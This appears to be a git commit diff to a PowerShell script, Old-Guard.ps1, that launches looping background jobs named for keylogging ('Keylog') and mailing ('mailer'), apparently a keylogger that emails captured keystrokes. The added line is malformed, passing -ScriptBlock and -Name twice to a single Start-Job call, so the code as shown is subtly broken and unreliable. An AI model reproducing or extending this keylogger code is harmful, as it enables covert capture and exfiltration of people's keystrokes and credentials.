cd0f9ee4db0aa663ec07ca65ce41da4c1f185c85
logsandstuff <59518250+logsandstuff@users.noreply.github.com>
2020-01-11 16:01:47 -0800

    Update Old-Guard.ps1

--- Old-Guard.ps1
+++ Old-Guard.ps1
@@ -237,8 +237,7 @@ function Old-Guard {
 
     $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
 
-    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name keys $Initil | Out-Null
-    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {mailer}} -Name mail $Initil | Out-Null
+    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {KeyLog}} -Name keys -ScriptBlock {for (;;) {mailer}} -Name mail $Initil | Out-Null
 
     if ($PSBoundParameters['CollectionInterval'])
     {
